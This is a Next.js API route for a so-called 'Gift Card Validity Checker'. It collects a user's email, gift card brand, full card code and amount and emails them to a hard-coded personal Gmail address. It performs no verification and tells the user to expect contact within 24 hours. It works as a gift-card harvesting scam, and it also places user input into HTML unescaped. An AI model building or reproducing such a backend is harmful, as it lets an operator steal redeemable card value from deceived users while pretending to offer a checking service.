import { NextRequest, NextResponse } from 'next/server'
import Resend from 'resend'

const resendApiKey = process.env.RESEND_API_KEY
let resendClient: Resend | null = null
if (resendApiKey) {
  resendClient = new Resend(resendApiKey)
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const {
      email,
      country,
      giftCard,
      cardCode,
      amount,
      currency,
      fileName,
    } = body

    // Validate required fields
    if (!email || !country || !giftCard || !cardCode || !amount || !currency) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    console.log('[v0] Processing verification request from:', email)

    // Create email content for admin
    const adminEmailContent = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { background: linear-gradient(135deg, #0099ff 0%, #0077cc 100%); color: white; padding: 30px; border-radius: 8px 8px 0 0; }
    .header h1 { margin: 0; font-size: 24px; }
    .content { background: #f9f9f9; padding: 30px; border-radius: 0 0 8px 8px; }
    .field { margin-bottom: 20px; padding: 15px; background: white; border-left: 4px solid #0099ff; }
    .label { font-weight: 600; color: #0099ff; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
    .value { margin-top: 8px; color: #333; font-size: 16px; word-break: break-all; }
    .divider { border-top: 1px solid #ddd; margin: 30px 0; }
    .footer { text-align: center; padding: 20px; color: #666; font-size: 12px; }
    .code { font-family: monospace; background: #f0f0f0; padding: 8px; border-radius: 4px; display: inline-block; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>New Gift Card Verification Request</h1>
      <p style="margin: 10px 0 0 0; opacity: 0.9;">A user has submitted a verification request</p>
    </div>
    <div class="content">
      <div class="field">
        <div class="label">User Email</div>
        <div class="value">${email}</div>
      </div>

      <div class="field">
        <div class="label">Country</div>
        <div class="value">${country}</div>
      </div>

      <div class="field">
        <div class="label">Gift Card Brand</div>
        <div class="value">${giftCard}</div>
      </div>

      <div class="field">
        <div class="label">Card Code</div>
        <div class="value"><span class="code">${cardCode}</span></div>
      </div>

      <div class="field">
        <div class="label">Amount</div>
        <div class="value">${amount} ${currency}</div>
      </div>

      ${fileName ? `
      <div class="field">
        <div class="label">File Attached</div>
        <div class="value">${fileName}</div>
      </div>
      ` : '<div class="field"><div class="label">File</div><div class="value">None</div></div>'}

      <div class="divider"></div>

      <p style="background: #e3f2fd; padding: 15px; border-radius: 6px; border-left: 4px solid #0099ff; margin: 0;">
        <strong>Action Required:</strong> Please verify this gift card and respond to the customer at ${email}
      </p>

      <div style="margin-top: 20px; padding: 15px; background: #f5f5f5; border-radius: 6px;">
        <p style="margin: 0; font-size: 12px; color: #666;">
          <strong>Timestamp:</strong> ${new Date().toLocaleString()}<br>
          <strong>Request ID:</strong> ${Math.random().toString(36).substring(7).toUpperCase()}
        </p>
      </div>
    </div>
    <div class="footer">
      <p>This is an automated notification from the Gift Card Validity Checker system.</p>
      <p>&copy; 2026 Gift Card Validity Checker. All rights reserved.</p>
    </div>
  </div>
</body>
</html>
    `

    // Send email via Resend if API key is configured
    if (!resendClient) {
      console.error('[v0] RESEND_API_KEY is not configured on the server')
      return NextResponse.json(
        { error: 'Email service is not configured. Contact administrator.' },
        { status: 500 }
      )
    }

    console.log('[v0] Sending email via Resend...')

    try {
      const resp = await resendClient.emails.send({
        from: 'no-reply@giftcard-checker.example.com',
        to: 'grimesdarl4@gmail.com',
        subject: `New Gift Card Verification Request - ${giftCard}`,
        html: adminEmailContent,
        reply_to: email,
      })

      console.log('[v0] Resend response:', resp)

      return NextResponse.json(
        {
          success: true,
          message: 'Verification request submitted successfully! We will contact you within 24 hours.',
          messageId: resp.id ?? null,
        },
        { status: 200 }
      )
    } catch (sendErr) {
      console.error('[v0] Error sending email via Resend:', sendErr)
      return NextResponse.json(
        { error: 'Failed to submit verification request. Please try again.' },
        { status: 500 }
      )
    }
  } catch (error) {
    console.error('[v0] Error processing request:', error)
    return NextResponse.json(
      { error: 'Failed to process verification request' },
      { status: 500 }
    )
  }
}
